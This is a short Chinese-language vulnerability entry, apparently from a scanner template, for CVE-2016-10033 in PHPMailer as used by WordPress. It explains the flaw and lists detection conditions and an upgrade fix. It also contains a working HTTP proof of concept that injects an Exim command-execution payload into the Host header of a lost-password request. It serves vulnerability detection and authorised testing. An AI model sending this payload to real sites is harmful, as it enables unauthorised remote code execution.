验证漏洞存在方法
    - 检查目标WordPress网站使用的PHPMailer版本是否低于5.2.18
    - 通过发送精心构造的请求测试是否存在远程代码执行漏洞

漏洞利用方法
    - WordPress PHPMailer在5.2.18之前的版本存在安全漏洞，攻击者可以通过在邮件传输的isMail传输的Sender属性中插入反斜杠双引号字符，向邮件命令传递额外参数，从而执行任意代码
    - 该漏洞允许远程攻击者在受影响的WordPress网站上执行未经授权的代码
    
PoC:
```http
GET /?author=1 HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Accept: */*
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login={{username}}
```

漏洞信息:
- CVE ID: CVE-2016-10033
- CVSS评分: 9.8 (严重)
- 影响: 远程代码执行
- 受影响版本: PHPMailer < 5.2.18
- 修复建议: 升级PHPMailer到5.2.18或更高版本

检测条件:
- 响应状态码为302
- 响应头中包含"wp-login.php?checkemail=confirm"
- 成功从响应中提取用户名信息

注意: 此PoC包含不安全的HTTP请求，使用时需谨慎并确保在授权测试环境中进行。
